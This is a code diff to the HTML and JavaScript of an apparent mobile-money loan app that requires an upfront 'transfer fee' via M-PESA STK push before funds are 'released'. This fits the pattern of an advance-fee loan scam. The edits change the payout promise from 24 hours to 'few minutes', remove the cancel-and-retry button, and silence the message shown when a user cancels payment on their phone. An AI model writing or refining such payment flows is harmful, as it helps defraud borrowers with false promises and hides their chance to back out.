@@ -463,7 +463,7 @@
       <div>
         <p class="text-xs font-bold text-emerald-900">Pay the transfer fee to release your funds</p>
         <p class="text-[11px] text-emerald-800 mt-0.5 leading-relaxed">
-          Once your payment is confirmed, your loan amount will be disbursed to your mobile wallet within <strong>24 hours</strong>.
+          Once your payment is confirmed, your loan amount will be disbursed to your mobile wallet within <strong>few minutes</strong>.
         </p>
       </div>
     </div>
@@ -588,11 +588,8 @@
         <span class="text-white/90 text-xs font-medium ml-1">Waiting for payment confirmation...</span>
       </div>
 
-      <button onclick="cancelStkAndRetry()" class="mt-6 w-full bg-white/15 backdrop-blur border border-white/30 text-white py-3 rounded-xl font-semibold text-sm active:scale-[0.98] transition-transform">
-        Didn't get the prompt? Try again
-      </button>
-
-      <p class="text-blue-100/80 text-[11px] mt-4 leading-relaxed">
+      <p class="text-blue-100/80 text-[11px] mt-5 leading-relaxed">
+        Didn't get the prompt?<br>
         Make sure your phone has network and check that the SIM is active.
       </p>
     </div>
@@ -847,7 +844,6 @@
     let pendingApplication = null;
     let loginReturnView = 'landingView';
     let paymentSource = 'dashboard';
-    let pollCancelled = false;
 
     const views = ['landingView', 'loginView', 'statusView', 'applyWizardView', 'eligibilityView', 'dashboardView', 'offerView', 'paymentView', 'stkSentView', 'processingView'];
     function showView(id) {
@@ -1696,18 +1692,6 @@
       await initiatePayment();
     }
 
-    function cancelStkAndRetry() {
-      pollCancelled = true;
-      const btn = $('payBtn');
-      const btnText = $('payBtnText');
-      btn.disabled = false;
-      btn.classList.remove('btn-processing');
-      btnText.textContent = PAY_BTN_LABEL;
-      setAmountBoxesDisabled(false);
-      showView('paymentView');
-      showToast('You can try again now.', { variant: 'warning' });
-    }
-
     async function initiatePayment() {
       const btn = $('payBtn');
       const btnText = $('payBtnText');
@@ -1731,6 +1715,7 @@
       result.classList.add('hidden');
       btnText.innerHTML = spinner() + ' Sending STK push...';
 
+      // Reset any previous failure so this attempt starts clean
       await sb.from('loan_applications')
         .update({ payment_status: 'unpaid' })
         .eq('id', currentApp.id);
@@ -1770,20 +1755,8 @@
       const btn = $('payBtn');
       const btnText = $('payBtnText');
 
-      pollCancelled = false;
-      const startTime = Date.now();
-      const MAX_DURATION_MS = 90_000;
-
-      while (Date.now() - startTime < MAX_DURATION_MS) {
-        if (pollCancelled) return;
-
-        const elapsed = Date.now() - startTime;
-        // Fast polling in first 20s, then back off to 3s
-        const interval = elapsed < 20_000 ? 1000 : 3000;
-
-        await new Promise(r => setTimeout(r, interval));
-        if (pollCancelled) return;
-
+      for (let i = 0; i < 30; i++) {
+        if (i > 0) await new Promise(r => setTimeout(r, 3000));
         const { data: loan } = await sb.from('loan_applications')
           .select('status, payment_status, mpesa_receipt, loan_amount, reference_no, processing_fee')
           .eq('id', loanId).single();
@@ -1798,21 +1771,8 @@
           return;
         }
 
-        // User cancelled on their phone
-        if (loan.payment_status === 'cancelled') {
-          if (pollCancelled) return;
-          btn.disabled = false;
-          btn.classList.remove('btn-processing');
-          btnText.textContent = PAY_BTN_LABEL;
-          setAmountBoxesDisabled(false);
-          showView('paymentView');
-          showToast('You cancelled the payment. Try again when ready.', { variant: 'warning' });
-          return;
-        }
-
         // Real failure (insufficient funds, wrong PIN, etc.)
         if (loan.payment_status === 'failed') {
-          if (pollCancelled) return;
           btn.disabled = false;
           btn.classList.remove('btn-processing');
           btnText.textContent = PAY_BTN_LABEL;
@@ -1821,10 +1781,11 @@
           showPayError('Payment failed. Please check your M-PESA balance and try again.');
           return;
         }
+
+        // Cancel / timeout stays silent — keep looping
       }
 
-      // Timeout
-      if (pollCancelled) return;
+      // No success, no failure — return to payment page silently
       btn.disabled = false;
       btn.classList.remove('btn-processing');
       btnText.textContent = PAY_BTN_LABEL;
